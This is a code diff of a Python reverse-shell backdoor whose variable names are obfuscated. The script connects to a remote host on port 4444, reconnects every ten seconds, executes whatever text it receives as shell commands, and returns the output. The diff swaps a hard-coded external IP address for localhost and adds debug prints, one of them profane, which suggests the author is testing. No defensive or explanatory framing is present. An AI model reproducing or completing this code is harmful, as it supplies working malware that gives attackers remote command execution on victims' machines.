@@ -2,7 +2,7 @@ import socket, sched, time, subprocess, os
 s = sched.scheduler(time.time, time.sleep)
 def main(sc):
     connectionest = False
-    gsjfhdkjghs5 = '217.215.145.129'
+    gsjfhdkjghs5 = 'localhost'
     h4ui3hf2 = 4444
     v43h34iu5 = socket.socket()
     try:
@@ -16,9 +16,9 @@ def main(sc):
     s.enter(10, 1, main, (sc,))
 
 
-
     while connectionest:
         try:
+            print('fhdus')
             gsf5ugh5us3 = v43h34iu5.recv(100000000)
             gsf5ugh5us3 = gsf5ugh5us3.decode()
             gsh5u4g4 = subprocess.Popen(gsf5ugh5us3, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE, stdin=subprocess.PIPE)
@@ -34,6 +34,7 @@ def main(sc):
                 print("[-] The output is none.")
                 print(sfgshkgs43)
                 v43h34iu5.send(bytes("Null", "utf-8") + gsysi4gy4)
+                print("shit")
             else:
                 v43h34iu5.send(sfgshkgs43 + gsysi4gy4)
 
